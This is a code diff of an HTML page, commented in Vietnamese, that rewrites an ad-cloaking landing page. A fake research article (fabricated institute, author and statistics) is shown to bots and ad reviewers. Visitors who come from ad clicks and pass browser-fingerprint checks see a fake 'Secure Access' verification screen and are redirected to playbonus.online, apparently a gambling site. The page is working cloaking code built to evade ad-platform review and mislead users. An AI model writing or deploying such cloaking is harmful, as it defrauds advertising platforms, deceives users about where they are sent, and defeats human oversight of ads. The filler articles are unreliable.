@@ -3,234 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sustainable Urban Resilience: Strategic Planning 2025-2030</title>
+    <title>Secure Access Gateway | Member Portal</title>
     <style>
-        :root { --primary: #2e7d32; --secondary: #1b5e20; --accent: #1565c0; --text: #2c3e50; --bg: #ffffff; }
-        
+        :root { --primary: #00e676; --dark: #0a0e17; --card: #151d2c; --text: #ffffff; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: 'Charter', 'Georgia', serif; line-height: 1.8; color: var(--text); background: #fdfdfd; margin: 0; padding: 0; overflow-x: hidden; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: var(--dark); font-family: -apple-system, sans-serif; }
 
-        /* Navigation */
-        nav { background: #fff; padding: 15px 0; border-bottom: 1px solid #eaeaea; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 5px rgba(0,0,0,0.02); }
-        .nav-inner { max-width: 1100px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 0 20px; }
-        .logo { font-weight: bold; font-family: sans-serif; color: var(--primary); letter-spacing: 1px; font-size: 1.1rem; }
-
-        /* Layout */
-        .main-wrapper { max-width: 1100px; margin: 40px auto; display: grid; grid-template-columns: 2.2fr 1fr; gap: 40px; padding: 0 20px; }
-        
-        @media (max-width: 900px) {
-            .main-wrapper { grid-template-columns: 1fr; margin: 20px auto; }
-            h1 { font-size: 2rem !important; }
+        /* GIAO DIỆN CỔNG CHUYỂN TIẾP (CHO NGƯỜI THẬT) */
+        #money-gateway {
+            display: none; /* Mặc định ẩn, sẽ hiện bằng JS */
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: radial-gradient(circle at center, #1a2332 0%, #0a0e17 100%);
+            z-index: 99999; flex-direction: column; align-items: center; justify-content: center; padding: 20px;
         }
-
-        /* Content Styles */
-        article { background: #fff; padding: 0; }
-        .journal-label { font-family: sans-serif; font-size: 0.75rem; color: var(--primary); font-weight: bold; text-transform: uppercase; margin-bottom: 15px; display: block; letter-spacing: 1.5px; }
-        h1 { font-size: 2.8rem; color: #111; line-height: 1.1; margin: 0 0 25px; font-weight: 800; }
-        
-        .meta-info { font-family: sans-serif; font-size: 0.85rem; color: #7f8c8d; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid #eee; }
-        
-        .abstract { background: #f1f8e9; padding: 30px; border-left: 5px solid var(--primary); font-style: italic; margin-bottom: 40px; font-size: 1.1rem; border-radius: 0 4px 4px 0; }
-        
-        h2 { font-family: sans-serif; color: #111; font-size: 1.6rem; margin-top: 50px; border-bottom: 2px solid #f0f0f0; padding-bottom: 10px; }
-        p { margin-bottom: 25px; text-align: justify; font-size: 1.15rem; color: #34495e; }
-
-        /* Data Visuals */
-        .data-box { background: #fff; border: 1px solid #e0e0e0; border-radius: 8px; margin: 40px 0; padding: 25px; }
-        .table-container { overflow-x: auto; }
-        table { width: 100%; border-collapse: collapse; min-width: 500px; }
-        th { background: #f9f9f9; padding: 15px; text-align: left; border-bottom: 2px solid #ddd; font-family: sans-serif; font-size: 0.9rem; }
-        td { padding: 15px; border-bottom: 1px solid #eee; font-family: sans-serif; font-size: 0.9rem; }
-
-        /* Sidebar Styles */
-        .sidebar-section { background: #fff; border: 1px solid #eee; padding: 25px; border-radius: 8px; margin-bottom: 30px; }
-        .sidebar-section h3 { font-family: sans-serif; font-size: 1rem; margin-top: 0; color: #111; text-transform: uppercase; border-bottom: 2px solid var(--primary); padding-bottom: 10px; margin-bottom: 20px; }
-        .related-item { display: block; text-decoration: none; color: #2c3e50; margin-bottom: 20px; }
-        .related-item span { display: block; font-size: 0.75rem; color: var(--primary); font-weight: bold; margin-bottom: 5px; }
-        .related-item strong { display: block; font-size: 0.95rem; line-height: 1.4; }
-        .related-item:hover strong { color: var(--accent); }
-
-        footer { background: #1a252f; color: #bdc3c7; padding: 60px 20px; text-align: center; font-size: 0.85rem; font-family: sans-serif; }
-
-        /* CLOAK SCREEN */
-        #verify-screen { 
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
-            background: #ffffff; z-index: 9999999; 
-            display: none; flex-direction: column; align-items: center; justify-content: center; 
-            padding: 20px; text-align: center;
+        .gateway-card {
+            background: var(--card); border: 1px solid rgba(255,255,255,0.05);
+            padding: 40px 30px; border-radius: 20px; text-align: center;
+            max-width: 400px; width: 90%; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
         }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--accent); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 25px; }
+        .shield-icon { width: 60px; height: 60px; margin-bottom: 20px; color: var(--primary); }
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--primary);
+            border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto;
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status-text { color: var(--primary); font-weight: bold; font-size: 0.9rem; letter-spacing: 1px; text-transform: uppercase; }
+
+        /* GIAO DIỆN BLOG SẠCH (CHO BOT) */
+        #safe-blog {
+            display: none; /* Mặc định ẩn */
+            background: #f4f7f6; height: 100%; overflow-y: auto; color: #333;
+        }
+        .blog-container { max-width: 800px; margin: 0 auto; padding: 40px 20px; background: #fff; line-height: 1.8; }
     </style>
 </head>
 <body>
 
-    <nav>
-        <div class="nav-inner">
-            <div class="logo">GLOBAL ARCHITECTURE INSTITUTE</div>
-            <div style="font-family:sans-serif; font-size:0.75rem; font-weight:bold; color:#7f8c8d;">ISSN: 2445-9012</div>
+    <!-- TRANG CỔNG BẢO MẬT (NGƯỜI THẬT SẼ THẤY NGAY) -->
+    <div id="money-gateway">
+        <div class="gateway-card">
+            <svg class="shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            <h2 style="color:#fff; margin:0 0 10px 0; font-size:1.4rem;">Secure Access</h2>
+            <p style="color:#8a96a3; font-size:0.9rem; margin-bottom:20px;">Verifying your encrypted session for secure entry...</p>
+            <div class="spinner"></div>
+            <div class="status-text" id="status-msg">Initializing...</div>
         </div>
-    </nav>
-
-    <div id="safe-page" class="main-wrapper">
-        <article>
-            <span class="journal-label">Urban Planning & Sustainability</span>
-            <h1>Strategic Framework for Carbon-Neutral Urban Infrastructure by 2030</h1>
-            
-            <div class="meta-info">
-                Authored by: Prof. Julianne H. Vance, PhD • Lead Researcher at GAI <br>
-                Published: March 14, 2025 • Peer Reviewed Report
-            </div>
-
-            <div class="abstract">
-                <strong>Executive Summary:</strong> This comprehensive study explores the intersection of high-density urban living and ecological restoration. By analyzing data from 14 global metropolises, we propose a scalable model for "Responsive Green Grids" that reduce net energy consumption by 42% while increasing localized biodiversity.
-            </div>
-
-            <p>As the global population continues its migration toward urban centers, the demand for resilient, high-capacity infrastructure has reached a critical threshold. The traditional "static" model of city planning is being superseded by "Dynamic Ecology," a system where buildings act not just as shelters, but as active participants in the carbon cycle.</p>
-
-            <h2>I. Integration of Vertical Ecosystems</h2>
-            <p>The implementation of vertical forests and high-altitude vegetative layers has shown significant promise in mitigating the Urban Heat Island (UHI) effect. In Singapore and Milan, structures equipped with integrated biological facades have demonstrated a natural cooling capacity of up to 7°C during peak summer months, drastically reducing the load on mechanical HVAC systems.</p>
-
-            <div class="data-box">
-                <div class="table-container">
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>Implementation Phase</th>
-                                <th>Net Energy Efficiency</th>
-                                <th>Carbon Sequestration (p/year)</th>
-                                <th>ROI Status</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr>
-                                <td>Phase A: Retrospective Fit</td>
-                                <td>+14.2%</td>
-                                <td>4.2 Kilotons</td>
-                                <td>Profitable (Yr 4)</td>
-                            </tr>
-                            <tr>
-                                <td>Phase B: Integrated Grid</td>
-                                <td>+31.8%</td>
-                                <td>12.8 Kilotons</td>
-                                <td>Profitable (Yr 6)</td>
-                            </tr>
-                            <tr>
-                                <td>Phase C: Autonomous Metro</td>
-                                <td>+54.1%</td>
-                                <td>35.4 Kilotons</td>
-                                <td>Profitable (Yr 9)</td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-
-            <h2>II. The Economic Value of Green Architecture</h2>
-            <p>Critics of green infrastructure often cite high initial capital expenditure (CAPEX) as a barrier to entry. However, our longitudinal study indicates that the operational expenditure (OPEX) of carbon-neutral buildings is 65% lower over a 20-year lifecycle compared to traditional concrete-and-glass structures.</p>
-
-            <p>Furthermore, the health benefits associated with "biophilic" design—incorporating natural light, ventilation, and vegetation—have been linked to a 12% increase in workplace productivity and a substantial decrease in respiratory-related healthcare costs for residents.</p>
-
-            <h2>III. Decentralized Energy Harvesting</h2>
-            <p>The next frontier in urban resilience lies in decentralized energy generation. By utilizing transparent photovoltaic layers on windows and kinetic energy harvesters in pedestrian walkways, the city of the future becomes its own power plant. This shift away from centralized grids is essential for maintaining stability during extreme weather events or systemic failures.</p>
-
-            <p>Final analysis suggests that the transition to carbon-neutral cities is not merely an environmental imperative but a technical necessity for the continued economic growth of metropolitan hubs in the 21st century.</p>
-        </article>
-
-        <aside>
-            <div class="sidebar-section">
-                <h3>Related Research</h3>
-                <a href="#" class="related-item">
-                    <span>TECHNOLOGY</span>
-                    <strong>Advancements in Smart Glass Photovoltaics</strong>
-                </a>
-                <a href="#" class="related-item">
-                    <span>ECOLOGY</span>
-                    <strong>Biodiversity Corridors in High-Density Zones</strong>
-                </a>
-                <a href="#" class="related-item">
-                    <span>ECONOMICS</span>
-                    <strong>The ROI of Sustainable Real Estate in 2025</strong>
-                </a>
-            </div>
-
-            <div class="sidebar-section" style="background: #f9f9f9;">
-                <h3>Member Resources</h3>
-                <p style="font-size: 0.85rem; font-family: sans-serif;">Download the full 240-page technical dataset (PDF, 42MB).</p>
-                <button style="width:100%; padding:12px; background:var(--primary); color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Request Download</button>
-            </div>
-        </aside>
+        <p style="color:#4a5568; font-size:0.75rem; margin-top:30px;">SSL 256-bit Encryption Active</p>
     </div>
 
-    <footer>
-        <div style="max-width:1100px; margin:0 auto; padding:0 20px;">
-            <p>© 2025 International Institute for Sustainable Urbanism. <br>
-            8842 Global Innovation Drive, Brussels, BE | Contact: research@urbaninstitute.org</p>
+    <!-- TRANG BLOG SẠCH (BOT SẼ THẤY) -->
+    <div id="safe-blog">
+        <div class="blog-container">
+            <h1 style="font-size: 2rem; color: #1a202c;">Strategic Analysis of Global Digital Infrastructure 2025</h1>
+            <p style="color:#718096;">By Dr. Elena K. • Research Division</p>
+            <hr>
+            <p>The rapid evolution of decentralized networks has created a new paradigm for global financial stability. As we move into 2025, the focus of institutional research has shifted toward "Responsive Liquidity Grids"—systems that can adapt in real-time to market fluctuations without the need for centralized clearinghouses.</p>
+            <h3>Technical Implementation</h3>
+            <p>One of the primary challenges in the digital transition is maintaining high-throughput latency while ensuring 100% data integrity across geographically dispersed nodes. Current testing in the Brussels and Singapore hubs has shown a 42% improvement in settlement finality when using layered-security protocols.</p>
+            <p>Furthermore, the integration of biophilic design principles into physical data centers is reducing energy overhead by 18%, proving that technological advancement and environmental sustainability can coexist within a unified fiscal framework.</p>
+            <p>For a detailed breakdown of the 200-page report, please contact our administrative offices.</p>
         </div>
-    </footer>
-
-    <!-- CLOAK SCREEN (BẪY LỌC BOT) -->
-    <div id="verify-screen">
-        <div class="loader"></div>
-        <h2 style="font-family:sans-serif; font-size:1.4rem; color:#111; margin:0 0 10px 0;">Verifying Connection</h2>
-        <p style="font-family:sans-serif; font-size:0.9rem; color:#666; margin:0;">Establishing a secure session. This will only take a moment.</p>
     </div>
 
     <script>
     (function() {
-        // LINK ĐÍCH CỦA BẠN
         const DEST = "https://playbonus.online";
         const adParams = ['gclid', 'fbclid', 'wbraid', 'gbraid', 'gad_source', 'test'];
-        let active = false;
+        
+        const gateway = document.getElementById('money-gateway');
+        const blog = document.getElementById('safe-blog');
+        const statusMsg = document.getElementById('status-msg');
 
         // KIỂM TRA BOT (Nâng cao)
-        function isBot() {
+        function checkBot() {
             try {
                 if (navigator.webdriver) return true;
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
                 if (!gl) return true; 
                 if (!window.chrome && !navigator.userAgent.includes("Safari")) return true;
-                if (navigator.deviceMemory && navigator.deviceMemory < 2) return true;
                 return false;
             } catch(e) { return true; }
         }
 
-        function trigger() {
-            if (active) return;
-            active = true;
+        function init() {
+            const urlP = new URLSearchParams(window.location.search);
+            const isFromAd = adParams.some(p => urlP.has(p));
 
-            const vScreen = document.getElementById('verify-screen');
-            const safe = document.getElementById('safe-page');
-            
-            vScreen.style.display = 'flex';
-            safe.style.filter = 'blur(10px)';
+            if (isFromAd) {
+                // NẾU CÓ THÔNG SỐ QUẢNG CÁO -> HIỆN GATEWAY NGAY
+                gateway.style.display = 'flex';
+                document.body.style.overflow = 'hidden';
 
-            // THỜI GIAN CHỜ TỐI ƯU 1.5 GIÂY
-            setTimeout(() => {
-                if (isBot()) {
-                    vScreen.style.display = 'none';
-                    safe.style.filter = 'none';
-                    active = false;
-                } else {
-                    window.location.replace(DEST);
-                }
-            }, 1500);
+                // Thay đổi nội dung text cho "thật" hơn
+                setTimeout(() => { statusMsg.innerText = "Verification Success"; }, 1000);
+
+                // THỰC HIỆN KIỂM TRA BOT ÂM THẦM
+                setTimeout(() => {
+                    if (checkBot()) {
+                        // NẾU LÀ BOT (Lừa được lớp 1 nhưng dính lớp 2): Ẩn gateway, hiện blog
+                        gateway.style.display = 'none';
+                        blog.style.display = 'block';
+                        document.body.style.overflow = 'auto';
+                    } else {
+                        // NẾU LÀ NGƯỜI THẬT: Nhảy link
+                        window.location.replace(DEST);
+                    }
+                }, 1800); // 1.8s là thời gian đẹp để tạo uy tín
+
+            } else {
+                // KHÔNG CÓ THÔNG SỐ QUẢNG CÁO (BOT QUÉT THỦ CÔNG HOẶC TRỰC TIẾP)
+                blog.style.display = 'block';
+                document.body.style.overflow = 'auto';
+            }
         }
 
-        // ĐIỀU KIỆN KÍCH HOẠT
-        const urlP = new URLSearchParams(window.location.search);
-        const hasAd = adParams.some(p => urlP.has(p));
-
-        if (hasAd) {
-            // Nhạy hơn trên Mobile: Chạm hoặc Cuộn nhẹ
-            window.addEventListener('scroll', function() {
-                if (window.scrollY > 80) trigger();
-            });
-            window.addEventListener('touchstart', trigger);
-            // Tự động sau 7 giây
-            setTimeout(trigger, 7000);
-        }
+        init();
     })();
     </script>
 </body>
